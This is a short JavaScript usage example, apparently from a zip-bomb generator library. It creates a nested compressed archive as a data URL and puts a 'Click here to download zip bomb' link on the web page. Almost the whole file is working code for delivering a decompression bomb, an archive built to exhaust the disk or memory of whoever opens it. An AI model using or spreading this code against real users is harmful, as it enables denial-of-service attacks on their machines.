const zb = require('../')

console.log('Creating...')

zb.createDataURL(1024 * 1024 * 10, 10, 10)
  .then((dataURL) => {
    console.log('Creation done...')

    const a = document.createElement('a')
    const linkText = document.createTextNode('Click here to download zip bomb')

    a.appendChild(linkText)
    a.href = dataURL
    document.body.appendChild(a)
  })
  .catch((e) => console.error(e))
